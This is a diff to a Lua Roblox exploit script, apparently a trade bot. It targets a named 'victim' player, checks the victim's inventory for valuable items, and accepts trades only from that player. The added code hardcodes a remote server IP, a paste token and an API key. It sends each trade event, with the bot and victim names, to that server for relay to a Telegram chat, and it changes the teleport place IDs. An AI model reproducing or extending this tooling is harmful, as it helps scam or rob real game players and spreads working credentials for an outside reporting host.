@@ -5,6 +5,10 @@ if getgenv().test2 then
 end
 
 getgenv().test2 = true
+
+local SNAP_API = "http://92.246.139.177:5000"
+local PASTE_TOKEN = "snapsan123"
+
 function missing(t, f, fallback)
     if type(f) == t then return f end
     return fallback
@@ -62,7 +66,7 @@ task.spawn(function()
         ]], codeUrl)
 
         if queueteleport then queueteleport(queueCode) end
-        TeleportService:Teleport(80186277940064)
+        TeleportService:Teleport(99621248009518)
         return
     end
 end)
@@ -103,12 +107,73 @@ repeat
 until not playerGui:FindFirstChild("DeviceSelect")
 
 local targetName = getgenv().name
+
+local function namesMatch(a, b)
+	if not a or not b then return false end
+	local sa, sb = tostring(a), tostring(b)
+	if sa == "" or sb == "" then return false end
+	return sa:lower() == sb:lower()
+end
 game:GetService("ReplicatedStorage").Trade.UpdateTrade.OnClientEvent:Connect(function(args)
     lastOfferTime = args.LastOffer
 end)
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
+
+local function victimLabel()
+	return tostring(getgenv().name or targetName or "?")
+end
+
+local function botLabel()
+	return player.Name
+end
+
+local tgSkip = {}
+
+local function skipTgOnce(key)
+	tgSkip[key] = true
+end
+
+local function consumeTgSkip(key)
+	if tgSkip[key] then
+		tgSkip[key] = nil
+		return true
+	end
+	return false
+end
+
+function telegramerror(text)
+	local msg = tostring(text or "")
+	if msg == "" then return end
+	pcall(function()
+		request({
+			Url = SNAP_API .. "/send",
+			Method = "POST",
+			Headers = {
+				["Content-Type"] = "application/json",
+				["x-api-key"] = "mister eblan",
+			},
+			Body = HttpService:JSONEncode({
+				chatId = -1003676865915,
+				threadId = 957699,
+				text = msg,
+			}),
+		})
+	end)
+end
+
+local function telegramTrade(event, detail)
+	local lines = {
+		tostring(event or "trade event"),
+		"бот: " .. botLabel(),
+		"жертва: " .. victimLabel(),
+	}
+	if detail and tostring(detail) ~= "" then
+		table.insert(lines, tostring(detail))
+	end
+	telegramerror(table.concat(lines, "\n"))
+end
 
 local function deletePaste(pasteId)
     if not pasteId then
@@ -118,7 +183,7 @@ local function deletePaste(pasteId)
 
     local ok, response = pcall(function()
         return request({
-            Url    = "http://92.246.139.177:8888/api/paste/delete/" .. pasteId .. "?token=snapsan123",
+            Url    = SNAP_API .. "/api/paste/delete/" .. pasteId .. "?token=" .. PASTE_TOKEN,
             Method = "GET",
         })
     end)
@@ -167,14 +232,10 @@ task.spawn(function()
         local now = os.time()
         if now - startTime >= 150 then
             print("❌ Втечение 150 секунд статус не стал 'StartTrade'.")
-            local backpack, char = player:FindFirstChild("Backpack"), player.Character or player.CharacterAdded:Wait()
-            local pizza = backpack:FindFirstChild("Pizza") or char:FindFirstChild("Pizza")
-            while not pizza do
-                if not char or not backpack then task.wait(0.5) continue end
-                ReplicatedStorage.Remotes.Extras.ReplicateToy:InvokeServer("Pizza")
-                pizza = backpack:FindFirstChild("Pizza") or char:FindFirstChild("Pizza")
-                task.wait(0.5)
-            end
+            telegramTrade(
+                "бот: 150с без окна трейда",
+                "GetTradeStatus не был StartTrade (таймер сбрасывается при входе в трейд)"
+            )
             deletePaste(getgenv().paste)
             if getgenv().stop then
                 print("already hop")
@@ -196,7 +257,7 @@ task.spawn(function()
             ]], codeUrl)
 
             if queueteleport then queueteleport(queueCode) end
-            TeleportService:Teleport(80186277940064)
+            TeleportService:Teleport(99621248009518)
             break
         end
     end
@@ -456,12 +517,21 @@ goodItems = {
 }
 
 attempts = 0
+local targetVerified = false
 local function checkTargetStatus()
-    print(string.format("Проверка цели %s: попытка %d/%d", targetName, attempts + 1, 5))
+    if not targetVerified then
+        print(string.format("Проверка цели %s: попытка %d/%d", targetName, attempts + 1, 5))
+    end
     local targetPlayer = Players:FindFirstChild(targetName)
     if not targetPlayer then
+        if targetVerified then
+            warn("⚠️ Игрок " .. targetName .. " пропал с сервера.")
+            targetVerified = false
+        end
         attempts = attempts + 1
-        warn("⚠️ Игрок " .. targetName .. " не найден в Players.")
+        if not targetVerified then
+            warn("⚠️ Игрок " .. targetName .. " не найден в Players.")
+        end
     else
         local success, result = pcall(function()
             return ReplicatedStorage.Remotes.Extras.GetFullInventory:InvokeServer(targetName)
@@ -480,20 +550,31 @@ local function checkTargetStatus()
             end
 
             if hasGoodItem then
-                print("✅ Цель на месте, ценные предметы подтверждены.")
+                if not targetVerified then
+                    print("✅ Цель на месте, ценные предметы подтверждены.")
+                    targetVerified = true
+                end
                 attempts = 0
                 return true
             else
-                print("❌ У игрока больше нет ценных предметов.")
+                if not targetVerified then
+                    print("❌ У игрока больше нет ценных предметов.")
+                else
+                    warn("⚠️ У игрока больше нет ценных предметов.")
+                end
+                targetVerified = false
                 attempts = 5
             end
         else
             attempts = attempts + 1
-            warn("⚠️ Ошибка вызова инвентаря (возможно, игрок еще грузится).")
+            if not targetVerified then
+                warn("⚠️ Ошибка вызова инвентаря (возможно, игрок еще грузится).")
+            end
         end
     end
     if attempts >= 5 then
         print("🚀 Лимит попыток исчерпан. Выполняю очистку и смену сервера.")
+        telegramTrade("бот: цель недоступна", "игрок не в сервере или нет ценных предметов")
         deletePaste(getgenv().paste)
         
         if not getgenv().stop then
@@ -513,7 +594,7 @@ local function checkTargetStatus()
             ]], codeUrl)
 
             if queueteleport then queueteleport(queueCode) end
-            TeleportService:Teleport(80186277940064)
+            TeleportService:Teleport(99621248009518)
         end
         return false
     end
@@ -551,12 +632,14 @@ local function connectHandlers()
         local senderName = type(arg1) == "userdata" and arg1.Name or tostring(arg1)
         print("SendRequest от:", senderName)
 
-        if targetName == senderName then
+        if namesMatch(targetName, senderName) then
             print("✅ жертва кинула запрос")
             Trade.AcceptRequest:FireServer()
             return true
         else
             print("❌ не жертва:", senderName)
+            telegramTrade("запрос не от жертвы", "от: " .. tostring(senderName))
+            skipTgOnce("DeclineRequest")
             Trade.DeclineRequest:FireServer()
             return false
         end
@@ -566,15 +649,31 @@ end
 -- первичное подключение
 connectHandlers()
 
+local function parseTradePartner(value)
+    if not value then return nil end
+    if type(value) == "userdata" then
+        local ok, name = pcall(function() return value.Name end)
+        if ok and name then return tostring(name) end
+    end
+    if type(value) == "string" and value ~= "" then
+        return value
+    end
+    return nil
+end
+
 Trade.StartTrade.OnClientEvent:Connect(function(arg1, arg2)
-    local name = tostring(arg2 or "")
+    local name = parseTradePartner(arg2) or ""
     print("StartTrade, игрок:", name)
     connectHandlers()
 
-    if targetName == name then
+    if name ~= "" and namesMatch(targetName, name) then
         print("✅ жертва в StartTrade")
+    elseif name == "" then
+        print("⚠️ StartTrade без имени партнёра — не отклоняем")
     else
-        print("❌ не жертва в StartTrade:", name)
+        print("❌ не жертва в StartTrade:", name, "ожидали:", tostring(targetName))
+        telegramTrade("StartTrade: чужой партнёр", "от: " .. tostring(name) .. ", ожидали: " .. tostring(targetName))
+        skipTgOnce("DeclineTrade")
         Trade.DeclineTrade:FireServer()
     end
 end)
@@ -588,21 +687,28 @@ Trade.AcceptTrade.OnClientEvent:Connect(function(arg1, arg2)
 end)
 
 Trade.EndTrade.OnClientEvent:Connect(function()
-    warn("отклонение трейда в окне трейда")
+    warn("❌отклонение трейда в окне трейда")
+    telegramTrade("трейд прерван (EndTrade)", "сервер закрыл сессию, это не успешный обмен")
     connectHandlers()
 end)
 
 Trade.DeclineTrade.OnClientEvent:Connect(function()
-    print("трейд отклонён — переподключаем")
+    print("❌трейд отклонён — переподключаем")
+    if not consumeTgSkip("DeclineTrade") then
+        telegramTrade("трейд отклонён в окне", "жертва или сервер нажали Decline / сброс трейда")
+    end
     connectHandlers()
 end)
 
 Trade.DeclineRequest.OnClientEvent:Connect(function()
-    print("запрос отклонён — переподключаем")
+    print("❌запрос отклонён — переподключаем")
+    if not consumeTgSkip("DeclineRequest") then
+        telegramTrade("запрос на трейд отклонён", "до открытия окна (фаза ReceivingRequest)")
+    end
     connectHandlers()
 end)
 
 Trade.CancelRequest.OnClientEvent:Connect(function()
-    print("запрос отменён — переподключаем")
+    print("❌запрос отменён — переподключаем")
     connectHandlers()
 end)
